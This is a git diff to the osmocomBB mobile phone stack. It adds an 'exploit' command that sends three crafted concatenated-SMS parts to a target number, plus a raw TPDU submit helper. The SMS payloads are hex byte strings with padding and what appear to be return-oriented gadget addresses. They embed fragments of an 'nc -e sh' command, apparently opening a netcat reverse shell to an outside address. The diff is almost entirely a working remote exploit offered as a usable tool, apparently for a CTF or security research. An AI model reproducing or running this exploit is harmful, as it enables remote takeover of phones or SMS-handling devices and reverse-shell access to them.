diff --git a/src/host/layer23/include/osmocom/bb/mobile/exploit.h b/src/host/layer23/include/osmocom/bb/mobile/exploit.h
new file mode 100644
index 00000000..56949ecd
--- /dev/null
+++ b/src/host/layer23/include/osmocom/bb/mobile/exploit.h
@@ -0,0 +1,8 @@
+#ifndef _EXPLOIT_SMS_H
+#define _EXPLOIT_SMS_H
+
+struct osmocom_ms;
+
+int exploit_send(struct osmocom_ms *ms, const char *sms_sca, const char *number, const char *sms_num);
+
+#endif
diff --git a/src/host/layer23/include/osmocom/bb/mobile/gsm411_sms.h b/src/host/layer23/include/osmocom/bb/mobile/gsm411_sms.h
index 3ed6710c..c248fcf2 100644
--- a/src/host/layer23/include/osmocom/bb/mobile/gsm411_sms.h
+++ b/src/host/layer23/include/osmocom/bb/mobile/gsm411_sms.h
@@ -38,4 +38,6 @@ int sms_send(struct osmocom_ms *ms, const char *sms_sca, const char *number,
 int gsm411_tx_sms_submit(struct osmocom_ms *ms, const char *sms_sca,
 	struct gsm_sms *sms);
 
+int gsm411_tx_sms_submit_raw_tpdu(struct osmocom_ms *ms, uint8_t msg_ref, uint8_t tpdu_len, uint8_t *sms_tpdu);
+
 #endif /* _GSM411_SMS_H */
diff --git a/src/host/layer23/src/mobile/Makefile.am b/src/host/layer23/src/mobile/Makefile.am
index 4e80e4ea..18c6a9bf 100644
--- a/src/host/layer23/src/mobile/Makefile.am
+++ b/src/host/layer23/src/mobile/Makefile.am
@@ -5,7 +5,7 @@ LDADD = ../common/liblayer23.a $(LIBOSMOCORE_LIBS) $(LIBOSMOVTY_LIBS) $(LIBOSMOG
 noinst_LIBRARIES = libmobile.a
 libmobile_a_SOURCES = gsm322.c gsm480_ss.c gsm411_sms.c gsm48_cc.c gsm48_mm.c \
 	gsm48_rr.c mnccms.c settings.c subscriber.c support.c \
-	transaction.c vty_interface.c voice.c mncc_sock.c primitives.c
+	transaction.c vty_interface.c voice.c mncc_sock.c primitives.c exploit.c
 
 bin_PROGRAMS = mobile
 
diff --git a/src/host/layer23/src/mobile/exploit.c b/src/host/layer23/src/mobile/exploit.c
new file mode 100644
index 00000000..121cbc25
--- /dev/null
+++ b/src/host/layer23/src/mobile/exploit.c
@@ -0,0 +1,153 @@
+#include <osmocom/bb/mobile/exploit.h>
+
+#include <stdint.h>
+#include <stdbool.h>
+#include <string.h>
+#include <unistd.h>
+
+#include <osmocom/bb/mobile/gsm411_sms.h>
+#include <osmocom/gsm/protocol/gsm_04_11.h>
+#include <osmocom/gsm/gsm0411_utils.h>
+
+static int gsm340_gen_tpdu(uint8_t *smsp, uint8_t msg_ref, const char *recipient, uint8_t data_coding_scheme, uint8_t user_data_len, uint8_t *user_data, bool udh_present)
+{
+    uint8_t *smsp_orig = smsp;
+    uint8_t da[12]; /* max len per 03.40 */
+    uint8_t da_len = 0;
+    uint8_t octet_len;
+    uint8_t sms_vpf = GSM340_TP_VPF_NONE;
+    uint8_t sms_vp;
+
+    /* TP-MTI (message type indicator) */
+    *smsp = GSM340_SMS_SUBMIT_MS2SC;
+
+    /* TP-RD */
+    if (0 /* FIXME */)
+        *smsp |= 0x04;
+
+    /* TP-VPF */
+    *smsp |= (sms_vpf << 3);
+
+    /* TP-SRI(deliver)/SRR(submit) */
+    if (0 /*sms->status_rep_req*/)
+        *smsp |= 0x20;
+
+    /* TP-UDHI (indicating TP-UD contains a header) */
+    if (udh_present)
+        *smsp |= 0x40;
+
+    /* TP-RP */
+    if (0 /*sms->reply_path_req*/)
+        *smsp |= 0x80;
+
+    smsp++;
+
+
+    /* generate message ref */
+    *smsp = msg_ref;
+    smsp++;
+
+
+    /* generate destination address */
+    if (recipient[0] == '+')
+        da_len = gsm340_gen_oa(da, sizeof(da), 0x1, 0x1, recipient + 1);
+    else
+        da_len = gsm340_gen_oa(da, sizeof(da), 0x0, 0x1, recipient);
+
+    memcpy(smsp, da, da_len);
+    smsp += da_len;
+
+
+    /* generate TP-PID */
+    (*smsp) = 0;
+    smsp++;
+
+
+    /* generate TP-DCS */
+    *smsp = data_coding_scheme;
+    smsp++;
+
+
+    /* generate TP-VP */
+    // switch (sms_vpf) {
+    // case GSM340_TP_VPF_NONE:
+    //     sms_vp = 0;
+    //     break;
+    // default:
+    //     fprintf(stderr, "VPF unsupported, please fix!\n");
+    //     exit(0);
+    // }
+    // smsp = msgb_put(msg, sms_vp);
+
+
+    /* generate TP-UDL */
+    *smsp = user_data_len;
+    smsp++;
+
+    /* Copy payload */
+    //NOTE: only works with 8 bit encoding!
+    memcpy(smsp, user_data, user_data_len);
+    smsp += user_data_len;
+
+    return smsp - smsp_orig;
+}
+
+int exploit_send(struct osmocom_ms *ms, const char *sms_sca, const char *number, const char *smsnum)
+{
+    //gsm411_tx_sms_submit_raw_tpdu(ms, 1, uint8_t tpdu_len, uint8_t *sms_tpdu);
+
+    uint8_t sms_hdr_template[] = {
+        0x05,       //UDHL
+        0x00,       //Information element identifier: 0 = concatenated SMS
+        0x03,       //LEN hdr payload
+        0x23,       //CSMS refnum
+        0x03,       //Total num parts
+    };
+
+    uint8_t sms1[140] = {0};
+    uint8_t sms2[140] = {0};
+    uint8_t sms3[140] = {0};
+
+    memcpy(sms1, sms_hdr_template, sizeof(sms_hdr_template));
+    sms1[5] = 0x4;  //part number
+    //memset(&sms1[6], 'A', 140-6);
+    //sms1[139] = 'X';
+    //UVWX = IP
+    //memcpy(&sms1[6], "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", 140-6);
+    memcpy(&sms1[6], "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\xa7\x72\x01\x00\x41\x41\x00\x00\x04\x6f\x03\x00\xa1\x16\x02\x00\x69\x35\x01\x00\x41\x41\x00\x00\xa7\x72\x01\x00\x41\x41\x00\x00\x00\x6f\x03\x00\xc4\x11\x01\x00", 134);
+
+    memcpy(sms2, sms_hdr_template, sizeof(sms_hdr_template));
+    sms2[5] = 0x5;  //part number
+    //memset(&sms2[6], 'B', 140-6);
+    //sms2[139] = 'Y';
+    memcpy(&sms2[6], "\x69\x35\x01\x00\x41\x41\x00\x00\xa1\x16\x02\x00\x01\x00\x00\x00\x41\x41\x00\x00\x41\x41\x00\x00\xc5\x3a\x01\x00\x00\x00\x00\x00\xc1\x3a\x01\x00\x04\x6f\x03\x00\xcc\x2a\x01\x00\xa4\x20\x03\x00\xa1\x16\x02\x00\xc0\x6e\x03\x00\x59\x26\x01\x00\x41\x41\x00\x00\x42\x42\x00\x00\x43\x43\x00\x00\x44\x44\x00\x00\x24\x3c\xfe\xff\x04\x21\x03\x00\x41\x41\x00\x00\xcb\x5b\x01\x00\x41\x41\x00\x00\xa7\x72\x01\x00\x41\x41\x00\x00\x00\x6f\x03\x00\x6e\x63\x20\x2d\x69\x35\x01\x00\x41\x41\x00\x00\xa7\x72\x01\x00\x41\x41\x00\x00\x04\x6f\x03\x00\x65\x73", 134);
+
+    memcpy(sms3, sms_hdr_template, sizeof(sms_hdr_template));
+    sms3[5] = 0x6;  //part number
+    //memset(&sms3[6], 'C', 140-6);
+    //sms3[139] = 'Z';
+    memcpy(&sms3[6], "\x68\x20\x69\x35\x01\x00\x41\x41\x00\x00\xa7\x72\x01\x00\x41\x41\x00\x00\x08\x6f\x03\x00\x32\x35\x34\x37\x69\x35\x01\x00\x41\x41\x00\x00\xa7\x72\x01\x00\x41\x41\x00\x00\x0c\x6f\x03\x00\x36\x34\x36\x30\x69\x35\x01\x00\x41\x41\x00\x00\xa7\x72\x01\x00\x41\x41\x00\x00\x10\x6f\x03\x00\x37\x36\x20\x31\x69\x35\x01\x00\x41\x41\x00\x00\xa1\x16\x02\x00\x00\x6f\x03\x00\x41\x41\x00\x00\x42\x42\x00\x00\xe0\x14\x01\x00\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41", 134);
+
+    uint8_t tpdu[163];
+    int tpdu_len;
+
+    if(smsnum[0] == '1') {
+        memset(tpdu, 0, sizeof(tpdu));
+        tpdu_len = gsm340_gen_tpdu(tpdu, 1, number, GSM338_DCS_1111_8BIT_DATA, sizeof(sms1), sms1, true);
+        gsm411_tx_sms_submit_raw_tpdu(ms, 1, tpdu_len, tpdu);
+    } else if(smsnum[0] == '2') {
+        memset(tpdu, 0, sizeof(tpdu));
+        tpdu_len = gsm340_gen_tpdu(tpdu, 2, number, GSM338_DCS_1111_8BIT_DATA, sizeof(sms2), sms2, true);
+        gsm411_tx_sms_submit_raw_tpdu(ms, 2, tpdu_len, tpdu);
+    } else if(smsnum[0] == '3') {
+        memset(tpdu, 0, sizeof(tpdu));
+        tpdu_len = gsm340_gen_tpdu(tpdu, 3, number, GSM338_DCS_1111_8BIT_DATA, sizeof(sms3), sms3, true);
+        gsm411_tx_sms_submit_raw_tpdu(ms, 3, tpdu_len, tpdu);
+    }
+
+    return 0;
+}
+
+
+
+//b *0x172a6
\ No newline at end of file
diff --git a/src/host/layer23/src/mobile/gsm411_sms.c b/src/host/layer23/src/mobile/gsm411_sms.c
index c476ff40..8d978f6d 100644
--- a/src/host/layer23/src/mobile/gsm411_sms.c
+++ b/src/host/layer23/src/mobile/gsm411_sms.c
@@ -712,6 +712,86 @@ error:
 		msg);
 }
 
+int gsm411_tx_sms_submit_raw_tpdu(struct osmocom_ms *ms, uint8_t msg_ref, uint8_t tpdu_len, uint8_t *sms_tpdu)
+{
+    struct msgb *msg;
+    struct gsm_trans *trans;
+    uint8_t *data, *rp_ud_len, *msg_tpdu;
+    int rc;
+    int transaction_id;
+    struct gsm_sms *sms;
+    uint8_t sca[11];    /* max len per 03.40 */
+
+    sms = sms_alloc();
+    sms->msg_ref = msg_ref;
+
+    LOGP(DLSMS, LOGL_INFO, "..._sms_submit()\n");
+
+    /* no running, no transaction */
+    if (!ms->started || ms->shutdown != MS_SHUTDOWN_NONE) {
+        LOGP(DLSMS, LOGL_ERROR, "Phone is down\n");
+        gsm411_sms_report(ms, sms, GSM411_RP_CAUSE_MO_TEMP_FAIL);
+        sms_free(sms);
+        return -EIO;
+    }
+
+    /* allocate transaction with dummy reference */
+    transaction_id = trans_assign_trans_id(ms, GSM48_PDISC_SMS, 0);
+    if (transaction_id < 0) {
+        LOGP(DLSMS, LOGL_ERROR, "No transaction ID available\n");
+        gsm411_sms_report(ms, sms, GSM411_RP_CAUSE_MO_CONGESTION);
+        sms_free(sms);
+        return -ENOMEM;
+    }
+    trans = trans_alloc(ms, GSM48_PDISC_SMS, transaction_id, new_callref++);
+    if (!trans) {
+        LOGP(DLSMS, LOGL_ERROR, "No memory for trans\n");
+        gsm411_sms_report(ms, sms, GSM411_RP_CAUSE_MO_TEMP_FAIL);
+        sms_free(sms);
+        return -ENOMEM;
+    }
+    gsm411_smc_init(&trans->sms.smc_inst, transaction_id, 0,
+        gsm411_mn_recv, gsm411_mm_send);
+    gsm411_smr_init(&trans->sms.smr_inst, transaction_id, 0,
+        gsm411_rl_recv, gsm411_mn_send);
+    trans->sms.sms = sms;
+    trans->sms.sapi = UM_SAPI_SMS;
+
+    msg = gsm411_msgb_alloc();
+
+    /* no orig Address */
+    data = (uint8_t *)msgb_put(msg, 1);
+    data[0] = 0x00; /* originator length == 0 */
+
+    /* Destination Address */
+    sca[1] = 0x80; /* no extension */
+    sca[1] |= ((ms->settings.sms_sca[0] == '+') ? 0x01 : 0x00) << 4; /* type */
+    sca[1] |= 0x1; /* plan*/
+
+    rc = gsm48_encode_bcd_number(sca, sizeof(sca), 1, ms->settings.sms_sca + (ms->settings.sms_sca[0] == '+'));
+    if (rc < 0) {
+        gsm411_sms_report(ms, sms, GSM411_RP_CAUSE_SEMANT_INC_MSG);
+        gsm411_trans_free(trans);
+        msgb_free(msg);
+        return rc;
+    }
+    data = msgb_put(msg, rc);
+    memcpy(data, sca, rc);
+
+    /* obtain a pointer for the rp_ud_len, so we can fill it later */
+    rp_ud_len = (uint8_t *)msgb_put(msg, 1);
+    *rp_ud_len = tpdu_len;
+
+    msg_tpdu = msgb_put(msg, tpdu_len);
+    memcpy(msg_tpdu, sms_tpdu, tpdu_len);
+
+    LOGP(DLSMS, LOGL_INFO, "TX: SMS DELIVER\n");
+
+    gsm411_push_rp_header(msg, GSM411_MT_RP_DATA_MO, sms->msg_ref);
+    return gsm411_smr_send(&trans->sms.smr_inst, GSM411_SM_RL_DATA_REQ,
+        msg);
+}
+
 /* create and send SMS */
 int sms_send(struct osmocom_ms *ms, const char *sms_sca, const char *number,
 	const char *text, uint8_t msg_ref)
diff --git a/src/host/layer23/src/mobile/vty_interface.c b/src/host/layer23/src/mobile/vty_interface.c
index a0ad9937..5f70c39b 100644
--- a/src/host/layer23/src/mobile/vty_interface.c
+++ b/src/host/layer23/src/mobile/vty_interface.c
@@ -44,6 +44,9 @@
 #include <osmocom/vty/telnet_interface.h>
 #include <osmocom/vty/misc.h>
 
+
+#include <osmocom/bb/mobile/exploit.h>
+
 extern struct llist_head ms_list;
 extern struct llist_head active_connections;
 
@@ -2824,6 +2827,92 @@ DEFUN(off, off_cmd, "off",
 	return CMD_SUCCESS;
 }
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+DEFUN(exploir, exploit_cmd, "exploit MS_NAME NUMBER SMSNUM",
+	"Send exploit\nName of MS (see \"show ms\")\nPhone number to send SMS "
+	"(Use digits '0123456789*#abc', and '+' to dial international)\nsmsnum")
+{
+	struct osmocom_ms *ms;
+	struct gsm_settings *set;
+	struct gsm_settings_abbrev *abbrev;
+	char *number, *sms_sca = NULL;
+
+	ms = get_ms(argv[0], vty);
+	if (!ms)
+		return CMD_WARNING;
+	set = &ms->settings;
+
+	if (!set->sms_ptp) {
+		vty_out(vty, "SMS not supported by this mobile, please enable "
+			"SMS support%s", VTY_NEWLINE);
+		return CMD_WARNING;
+	}
+
+	if (ms->subscr.sms_sca[0])
+		sms_sca = ms->subscr.sms_sca;
+	else if (set->sms_sca[0])
+		sms_sca = set->sms_sca;
+
+	if (!sms_sca) {
+		vty_out(vty, "SMS sms-service-center not defined on SIM card, "
+			"please define one at settings.%s", VTY_NEWLINE);
+		return CMD_WARNING;
+	}
+
+	number = (char *)argv[1];
+	llist_for_each_entry(abbrev, &set->abbrev, list) {
+		if (!strcmp(number, abbrev->abbrev)) {
+			number = abbrev->number;
+			vty_out(vty, "Using number '%s'%s", number,
+				VTY_NEWLINE);
+			break;
+		}
+	}
+	if (vty_check_number(vty, number))
+		return CMD_WARNING;
+
+	exploit_send(ms, sms_sca, number, argv[2]);
+
+	return CMD_SUCCESS;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 #define SUP_NODE(item) \
 	install_element(SUPPORT_NODE, &cfg_ms_sup_item_cmd);
 
@@ -2861,6 +2950,7 @@ int ms_vty_init(void)
 	install_element(ENABLE_NODE, &call_dtmf_cmd);
 	install_element(ENABLE_NODE, &sms_cmd);
 	install_element(ENABLE_NODE, &service_cmd);
+	install_element(ENABLE_NODE, &exploit_cmd);
 	install_element(ENABLE_NODE, &test_reselection_cmd);
 	install_element(ENABLE_NODE, &delete_forbidden_plmn_cmd);
 
